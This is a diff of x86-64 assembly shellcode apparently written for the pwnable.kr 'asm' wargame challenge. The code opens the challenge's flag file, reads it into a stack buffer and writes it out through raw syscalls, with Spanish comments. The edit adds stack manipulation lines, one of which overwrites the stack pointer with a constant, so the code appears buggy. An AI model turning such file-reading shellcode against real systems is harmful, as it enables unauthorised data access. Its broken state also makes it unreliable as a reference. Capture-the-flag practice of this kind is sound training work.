@@ -12,12 +12,17 @@ http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
 
 filetoopen db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong',0
 
+push 0x41
+sub rsp, 8
+mov rsp, 0x41
+mov r10, rsp # direc del nombre
+
 sub rsp, 0x100
+mov r9, rsp # direc del buffer
 
 # open
-#mov rdx, 0644o
-#mov rsi, 0 # O_RONLY
-mov rdi, filetoopen
+mov rsi, 0 # O_RONLY
+mov rdi, r10
 mov rax, 2
 syscall
 mov rbx, rax # fd
@@ -27,11 +32,6 @@ mov rdx, 0x100
 mov rsi, rsp
 mov rdi, rbx
 mov rax, 0
-syscall
-
-# close
-mov rdi, rbx
-mov rax, 3
 syscall
 
 # write
